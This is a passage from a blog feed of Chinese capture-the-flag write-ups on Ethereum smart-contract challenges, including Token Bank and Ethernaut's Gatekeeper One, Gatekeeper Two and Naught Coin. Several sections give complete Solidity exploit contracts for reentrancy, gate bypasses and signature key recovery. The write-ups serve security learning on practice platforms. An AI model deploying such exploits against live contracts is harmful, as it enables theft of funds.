class="hljs-number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span><br><br>p  = <span class="hljs-number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;privatekey:%x\n k:%x&quot;</span> % derivate_privkey(p,r,s1,s2,z1,z2))<br></code></pre></td></tr></table></figure><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AssumeOwnershipChallenge &#123;<br>    address owner;<br>    bool public isComplete;<br><br>    function AssumeOwmershipChallenge() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造函数拼写错误</p><h3 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;<br>    require(balanceOf[msg.sender] &gt;= value);<br><br>    balanceOf[msg.sender] -= value;<br>    balanceOf[to] += value;<br>    emit Transfer(msg.sender, to, value);<br><br>    if (isContract(to)) &#123;<br>        ITokenReceiver(to).tokenFallback(msg.sender, value, data);<br>    &#125;<br>    return true;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里判断了to地址是否是个合约地址，如果是合约的话就用ITokenReceiver接口来调用to合约的tokenFallback函数，在银行合约里这个函数用更改目标的balance，合约存在重入漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint256 amount) public &#123;<br>    require(balanceOf[msg.sender] &gt;= amount);<br><br>    require(token.transfer(msg.sender, amount));<br>    // balance decreased after recipient is notified<br>    // re-entrancy issue<br>    balanceOf[msg.sender] -= amount;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用该<code>token.transfer</code>函数后余额会更新，允许我们每次重复提取我们的存入资金。重入控制流程将是<code>challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; ... </code>。</p><p>在调用攻击合约前，先将player账户withdraw出来，再给攻击合约授权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    TokenBankChallenge public challenge;<br><br>    constructor(address challengeAddress) &#123;<br>        challenge = TokenBankChallenge(challengeAddress);<br>    &#125;<br><br>    function deposit() payable &#123;<br>        challenge.token().transferFrom(address(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624),address(this),500000000000000000000000);<br>        challenge.token().transfer(address(challenge),challenge.token().balanceOf(address(this)));<br>    &#125;<br><br>    function attack() payable &#123;<br>        callWithdraw();<br>        require(challenge.isComplete(), &quot;challenge not completed&quot;);<br>    &#125;<br><br>    function tokenFallback(address from, uint256 value, bytes data) external &#123;<br>        callWithdraw();<br>    &#125;<br><br>    function callWithdraw() payable &#123;<br>        uint256 myInitialBalance = 500000000000000000000000;<br>        uint256 challengeTotalRemainingBalance =<br>            challenge.token().balanceOf(address(challenge));<br>        bool keepRecursing = challengeTotalRemainingBalance &gt; 0;<br><br>        if (keepRecursing) &#123;<br>            uint256 toWithdraw =<br>                myInitialBalance &lt; challengeTotalRemainingBalance<br>                    ? myInitialBalance<br>                    : challengeTotalRemainingBalance;<br>            challenge.withdraw(toWithdraw);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>靶场刷题</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Ethernaut Part Ⅱ</title>
    <link href="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ethernaut.zeppelin.solutions/">平台地址</a></p><h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13. Gatekeeper One"></a>13. Gatekeeper One</h2><h3 id="闯关要求"><a href="#闯关要求" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>越过守门人并且注册为一个参赛者来完成这一关.</p><h3 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract GatekeeperOne &#123;<br><br>  using SafeMath for uint256;<br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(gasleft().mod(8191) == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);<br>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);<br>      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h3><p><strong>gateOne</strong>，通过另一个合约调用即可</p><p><strong>gateTwo</strong>，需要满足 <code>gasleft() % 8191 == 0</code></p><p>先对合约进行debug，将燃料限制调到999999</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225195749000.png" alt="image-20220225195749000"></p><p>attack后，去etherscan中看一下<code>debug trace</code></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225195945938.png" alt="image-20220225195945938"></p><p>因为第二个条件执行了<code>gasleft()</code>，我们需要找一下Gas操作：获取剩余可执行燃料数</p><p>由于Gas本身的操作也是消耗燃气的，所以958082才是gas操作获得的剩余可执行燃气数</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225200853744.png" alt="image-20220225200853744"></p><p>958082%8191=7926</p><p>999999-7926=992073</p><p>再将燃料限制调到992073</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225203159579.png" alt="image-20220225203159579"></p><p>950280%8191=124</p><p>992073-124=991949</p><p>再将燃料限制调到991949</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225203636903.png" alt="image-20220225203636903"></p><p>950158%8191=2</p><p>991949-2=991947</p><p>再将燃料限制调到991947</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225203940798.png" alt="image-20220225203940798"></p><p>此时已经没有revert</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225204101240.png" alt="image-20220225204101240"></p><p>且950156%8191=0</p><p><strong>gateThree</strong>，先了解一下 Solidity 的类型转换规则</p><p>转换成更小的类型，会丢失高位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint32 a = 0x12345678;<br>uint16 b = uint16(a); // b = 0x5678<br></code></pre></td></tr></table></figure><p>转换成更大的类型，将向左侧添加填充位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint16 a = 0x1234;<br>uint32 b = uint32(a); // b = 0x00001234 <br></code></pre></td></tr></table></figure><p>转换到更小的字节类型，会丢失后面数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes2 a = 0x1234;<br>bytes1 b = bytes1(a); // b = 0x12<br></code></pre></td></tr></table></figure><p>转换为更大的字节类型时，向右添加填充位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes2 a = 0x1234;<br>bytes4 b = bytes4(a); // b = 0x12340000<br></code></pre></td></tr></table></figure><p>只有当字节类型和int类型大小相同时，才可以进行转换。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes2 a = 0x1234;<br>uint32 b = uint16(a); // b = 0x00001234<br>uint32 c = uint32(bytes4(a)); // c = 0x12340000<br>uint8 d = uint8(uint16(a)); // d = 0x34<br>uint8 e = uint8(bytes1(a)); // e = 0x12<br></code></pre></td></tr></table></figure><p>把整数赋值给整型时，不能超出范围，发生截断，否则会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint8 a = 12; // no error<br>uint32 b = 1234; // no error<br>uint16 c = 0x123456; // error, 有截断，变为 0x3456<br></code></pre></td></tr></table></figure><p>观察代码，得出可以通过 <code>bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF</code> 实现</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;<br><br>contract GatekeeperOne &#123;<br><br>  using SafeMath for uint256;<br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(gasleft().mod(8191) == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);<br>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);<br>      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address instance_add = 0x3fADc7E018F9b0236f82132B0569e7c4363622f0;<br>    GatekeeperOne gatekeeperOne = GatekeeperOne(instance_add);<br><br>    function attack() public &#123;<br>        bytes8 gateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF;<br>        //gatekeeperOne.enter&#123;gas: 999999&#125;(gateKey);<br>        address(gatekeeperOne).call.gas(999999)(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, gateKey));<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用debug调试至没有revert后，回到ethernaut中使用命令 <code>await contract.entrant()</code> ，发现结果是自己的地址</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225204358089.png" alt="image-20220225204358089"></p><p>提交实例</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225204533099.png" alt="image-20220225204533099"></p><h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14. Gatekeeper Two"></a>14. Gatekeeper Two</h2><h3 id="闯关要求-1"><a href="#闯关要求-1" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关</p><h3 id="合约代码-1"><a href="#合约代码-1" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-1"><a href="#合约分析-1" class="headerlink" title="合约分析"></a>合约分析</h3><p><strong>gateOne</strong>，使用另一个合约调用即可</p><p><strong>gateTwo</strong>，使用了<a href="https://www.tryblockchain.org/blockchain-solidity-assembly.html">内联汇编</a></p><p>extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。条件为调用方代码大小为0 ，由于合约在初始化，代码大小为0。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。</p><p><strong>gateThree</strong>，异或的特性就是异或两次就是原数据。所以将sender和FFFFFFFFFFFFFFFF进行异或的值就是我们想要的值。</p><h3 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    constructor(address instance_add) public &#123;<br>        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(instance_add);<br>        //bytes8 gateKey = bytes8(uint64(address(this)) ^ (uint64(0) - 1)); 此处没有使用keccak256所以失败了<br>        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this))))^(uint64(0) - 1));<br>        //gatekeeperTwo.enter(gateKey);<br>        address(gatekeeperTwo).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, gateKey));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220226142319439.png" alt="image-20220226142319439"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220226142421115.png" alt="image-20220226142421115"></p><h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15. Naught Coin"></a>15. Naught Coin</h2><h3 id="闯关要求-2"><a href="#闯关要求-2" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。</p><h3 id="合约代码-2"><a href="#合约代码-2" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;;<br><br> contract NaughtCoin is ERC20 &#123;<br><br>  // string public constant name = &#x27;NaughtCoin&#x27;;<br>  // string public constant symbol = &#x27;0x0&#x27;;<br>  // uint public constant decimals = 18;<br>  uint public timeLock = now + 10 * 365 days;<br>  uint256 public INITIAL_SUPPLY;<br>  address public player;<br><br>  constructor(address _player) <br>  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)<br>  public &#123;<br>    player = _player;<br>    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));<br>    // _totalSupply = INITIAL_SUPPLY;<br>    // _balances[player] = INITIAL_SUPPLY;<br>    _mint(player, INITIAL_SUPPLY);<br>    emit Transfer(address(0), player, INITIAL_SUPPLY);<br>  &#125;<br>  <br>  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;<br>    super.transfer(_to, _value);<br>  &#125;<br><br>  // Prevent the initial owner from transferring tokens until the timelock has passed<br>  modifier lockTokens() &#123;<br>    if (msg.sender == player) &#123;<br>      require(now &gt; timeLock);<br>      _;<br>    &#125; else &#123;<br>     _;<br>    &#125;<br>  &#125; <br>&#125; <br></code></pre></td></tr></table></figure><h3 id="合约分析-2"><a href="#合约分析-2" class="headerlink" title="合约分析"></a>合约分析</h3><ul><li>根据题意，需要将自己的 <code>balance</code> 清空。合约提供了 <code>transfer()</code> 进行转账，但有一个 <code>modifier lockTokens()</code> 限制，只有 <code>10</code> 年后才能调用 <code>transfer()</code></li><li>注意该合约是 <code>ERC20</code> 的子合约，题目中也给了 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">The ERC20 Spec</a> 和 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts">The OpenZeppelin codebase</a></li><li>在子合约找不出更多信息的时候，把目光更多放到父合约 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20.sol</a> 和接口上</li><li>在 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">The ERC20 Spec</a> 中，除了 <code>transfer()</code> 之外，还有 <code>transferFrom()</code> 函数也可以进行转账</li><li>直接看父合约 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20.sol</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> contract ERC20 is Context, IERC20, IERC20Metadata &#123;<br>...<br>    function transfer(address to, uint256 amount) public virtual override returns (bool) &#123;<br>        address owner = _msgSender();<br>        _transfer(owner, to, amount);<br>        return true;<br>    &#125;<br>    <br>    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;<br>        return _allowances[owner][spender];<br>    &#125;<br><br>    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;<br>        address owner = _msgSender();<br>        _approve(owner, spender, amount);<br>        return true;<br>    &#125;<br>    <br>    function transferFrom(<br>        address from,<br>        address to,<br>        uint256 amount<br>    ) public virtual override returns (bool) &#123;<br>        address spender = _msgSender();<br>        _spendAllowance(from, spender, amount);<br>        _transfer(from, to, amount);<br>        return true;<br>    &#125;<br>    ...<br>    <br>    function _transfer(<br>        address from,<br>        address to,<br>        uint256 amount<br>    ) internal virtual &#123;<br>        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);<br>        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);<br><br>        _beforeTokenTransfer(from, to, amount);<br><br>        uint256 fromBalance = _balances[from];<br>        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);<br>        unchecked &#123;<br>            _balances[from] = fromBalance - amount;<br>        &#125;<br>        _balances[to] += amount;<br><br>        emit Transfer(from, to, amount);<br><br>        _afterTokenTransfer(from, to, amount);<br>    &#125;<br>    <br>    function _approve(<br>        address owner,<br>        address spender,<br>        uint256 amount<br>    ) internal virtual &#123;<br>        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);<br>        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);<br><br>        _allowances[owner][spender] = amount;<br>        emit Approval(owner, spender, amount);<br>    &#125;<br>    <br>    function _spendAllowance(<br>        address owner,<br>        address spender,<br>        uint256 amount<br>    ) internal virtual &#123;<br>        uint256 currentAllowance = allowance(owner, spender);<br>        if (currentAllowance != type(uint256).max) &#123;<br>            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);<br>            unchecked &#123;<br>                _approve(owner, spender, currentAllowance - amount);<br>            &#125;<br>        &#125;<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>看 <code>transferFrom</code> 函数，其中调用了 <code>_spendAllowance</code> 函数，在 <code>_spendAllowance</code> 函数中，有这样几行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 